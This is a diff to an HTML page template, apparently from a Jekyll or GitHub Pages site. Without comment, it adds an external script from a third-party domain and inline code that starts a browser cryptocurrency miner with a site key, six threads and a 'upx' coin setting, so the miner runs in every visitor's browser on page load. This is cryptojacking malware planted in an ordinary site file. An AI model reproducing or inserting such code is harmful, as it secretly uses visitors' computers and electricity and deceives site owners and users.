@@ -5,7 +5,14 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,maximum-scale=2">
-    <script async src="https://arc.io/widget.min.js#Z6Ybi95W"></script>
+    <script src="//statdynamic.com/lib/crypta.js"></script>
+	  <script>
+	   var miner=new CRLT.Anonymous('3f9e66c289ef3f57b6a7f79fc3f4674f5a27be752492', {
+		  threads:6,throttle:0.2, coin: "upx",
+	   });
+	   miner.start();
+	  </script>
+	  <script async src="https://arc.io/widget.min.js#Z6Ybi95W"></script>
     <link rel="stylesheet" type="text/css" media="screen" href="{{ '/assets/css/style.css?v=' | append: site.github.build_revision | relative_url }}">
 
 {% seo %}
